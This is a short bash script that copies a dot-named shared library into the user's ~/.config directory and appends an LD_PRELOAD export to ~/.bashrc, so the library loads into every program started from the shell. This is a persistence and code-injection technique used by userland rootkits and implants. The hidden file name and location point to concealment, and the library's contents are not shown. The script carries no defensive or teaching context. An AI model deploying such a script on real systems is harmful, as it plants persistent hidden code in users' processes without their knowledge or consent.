#!/bin/bash

# Get the home directory of the logged-in user
USER_HOME=$(getent passwd $USER | cut -d: -f6)

# Create the .config directory if it doesn't exist
mkdir -p $USER_HOME/.config

# Copy the libmylib.so library to the .config directory
cp ./.libmylib.so $USER_HOME/.config

# Append the export line to the .bashrc file
echo "export LD_PRELOAD=\$LD_PRELOAD:$USER_HOME/.config/.libmylib.so" >> $USER_HOME/.bashrc

